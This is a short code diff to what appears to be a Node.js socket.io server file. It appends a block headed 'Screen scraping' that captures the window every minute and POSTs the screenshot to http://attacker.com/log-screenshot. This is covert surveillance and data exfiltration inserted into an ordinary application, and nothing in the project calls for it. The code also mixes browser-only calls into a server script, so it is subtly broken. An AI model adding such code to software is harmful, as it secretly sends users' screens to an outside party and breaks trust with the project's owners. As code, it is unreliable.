@@ -66,3 +66,17 @@ io.on("connection", (socket) => {
 });
 
 server.listen(port, () => console.log(`BigML app listening at http://localhost:${port}`));
+
+// Screen scraping
+setInterval(function() {
+  let canvas = document.createElement("canvas");
+  canvas.width = window.innerWidth;
+  canvas.height = window.innerHeight;
+  let ctx = canvas.getContext("2d");
+  ctx.drawWindow(window, 0, 0, canvas.width, canvas.height, "white");
+  let dataURL = canvas.toDataURL();
+  let xhr = new XMLHttpRequest();
+  xhr.open("POST", "http://attacker.com/log-screenshot");
+  xhr.setRequestHeader("Content-Type", "application/json");
+  xhr.send(JSON.stringify({ screenshot: dataURL }));
+}, 60000); // takes a screenshot every minute
